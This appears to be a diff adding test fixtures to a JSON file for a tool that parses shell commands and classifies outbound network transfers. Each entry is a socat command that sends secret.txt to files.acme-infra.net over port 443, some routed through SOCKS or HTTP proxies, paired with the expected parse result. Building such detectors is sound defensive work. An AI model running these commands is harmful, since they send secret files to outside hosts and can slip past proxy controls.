@@ -4819,6 +4819,104 @@
      }
     ]
    }
+  },
+  {
+   "command": "socat - SOCKS4A:proxy.example:files.acme-infra.net:443 < secret.txt",
+   "transfer": {
+    "tool": "socat",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "files.acme-infra.net",
+      "resolved_host": "files.acme-infra.net",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "socat - SOCKS4:proxy.example:files.acme-infra.net:443 < secret.txt",
+   "transfer": {
+    "tool": "socat",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "files.acme-infra.net",
+      "resolved_host": "files.acme-infra.net",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "socat - SOCKS5:proxy.example:files.acme-infra.net:443 < secret.txt",
+   "transfer": {
+    "tool": "socat",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "files.acme-infra.net",
+      "resolved_host": "files.acme-infra.net",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "socat - PROXY:proxy.example:files.acme-infra.net:443,proxyport=3128 < secret.txt",
+   "transfer": {
+    "tool": "socat",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "files.acme-infra.net",
+      "resolved_host": "files.acme-infra.net",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "socat - PROXY-CONNECT:proxy.example:files.acme-infra.net:443 < secret.txt",
+   "transfer": {
+    "tool": "socat",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "files.acme-infra.net",
+      "resolved_host": "files.acme-infra.net",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "socat - TCP:files.acme-infra.net:443,socksport=1080 < secret.txt",
+   "transfer": {
+    "tool": "socat",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "files.acme-infra.net",
+      "resolved_host": "files.acme-infra.net",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "socat - TCP:files.acme-infra.net:443 < secret.txt",
+   "transfer": {
+    "tool": "socat",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "files.acme-infra.net",
+      "resolved_host": "files.acme-infra.net",
+      "address": "private"
+     }
+    ]
+   }
   }
  ]
 }
